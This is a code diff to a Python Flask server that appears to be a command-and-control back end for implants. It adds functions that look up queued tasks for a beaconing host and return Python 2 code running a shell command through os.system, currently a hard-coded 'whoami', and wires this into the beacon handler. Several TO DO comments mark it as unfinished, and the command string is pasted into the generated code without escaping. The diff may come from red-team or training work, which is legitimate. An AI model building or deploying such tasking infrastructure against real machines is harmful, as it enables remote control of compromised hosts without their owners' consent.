@@ -87,6 +87,35 @@ class WebServer(object):
         except Exception:
             return False
 
+    def generate_command_code(self, command):
+        """
+        DESCRIPTION:
+            This function generates Python 2.x code to execute a shell command
+        """
+        # DEBUGGING
+        return 'import os; os.system("' + command + '")'
+
+    def get_tasking(self, hostname, process_id):
+        """
+        DESCRIPTION:
+            This function gets tasking (if applicable)
+        """
+        with self.connection.cursor() as cursor:
+            statement = "SELECT * FROM `tasks` WHERE `hostname` = %s AND `process_id` = %s LIMIT 1"
+            cursor.execute(statement, (hostname, process_id))
+
+            # if tasks
+            if cursor.rowcount == 1:
+                # TO DO: if "task_action" is "command"
+
+                # TO DO: create another function called generate_command_code(command) and call that here
+                return self.generate_command_code("whoami")
+
+            # else no tasks
+            # returns empty HTTP response
+            else:
+                return ""
+
     def beacon_response(self):
         """
         DESCRIPTION:
@@ -156,12 +185,9 @@ class WebServer(object):
                             process_id = j["process_id"]
                             operating_system = j["operating_system"]
 
-                            # TO DO: check for tasking
-                            #       there should be a function in WebServer class called check_tasking(hostname, process_id)
-                            #       since we just JSON decoded the POST data above which contains hostname and process_id
-
-                            # DEBUGGING
-                            return "decrypted"
+                            # returns empty HTTP response if no tasking
+                            # returns task Python 2.x code in the HTTP response
+                            return self.get_tasking(hostname, process_id)
 
     def start_flask(self, protocol, port, profile):
         """
